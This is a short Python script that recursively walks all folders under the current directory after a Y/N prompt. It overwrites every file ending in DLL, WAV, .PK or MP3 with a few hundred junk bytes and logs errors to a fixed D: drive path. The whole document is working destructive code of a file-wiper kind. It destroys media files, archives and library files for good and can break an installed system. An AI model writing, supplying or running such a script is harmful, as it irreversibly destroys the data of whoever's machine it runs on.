import os
def searchs(lists,nexts = '',CWD = os.getcwd()):
	CWD = CWD + nexts
	for i in lists:
		try:
			searchs(os.listdir(CWD + '\\' + i),str('\\'+i), CWD)
		except Exception as e:
			try:
				types2 = i[-3]+i[-2]+i[-1]
				types = types2.upper()
				if types == 'DLL' or types == 'WAV' or types == 'WAV' or types == '.PK' or types == 'MP3':
					print(CWD + '\\' + i + '\n')
					#print(types)
					try:
						w = open(CWD + '\\' + i,'wb')
						binary = {}
						i = 0
						while i < 100:
							w.write(b'x01234')
							i+=1
						w.close()
					except Exception as r:
						print(r,'\n')
			except Exception as e:
				with open('D:\\\\hash and dehash\\LogErrors.txt','a') as append:
					print('|',CWD , '\\' , i , '\n', '  :  ' , e , '|',file = append)
					print('\n',file = append)
answer = input('Go(Y/N): ')
if answer == 'Y': 
	arrDir = os.listdir(os.getcwd())
	searchs(arrDir)
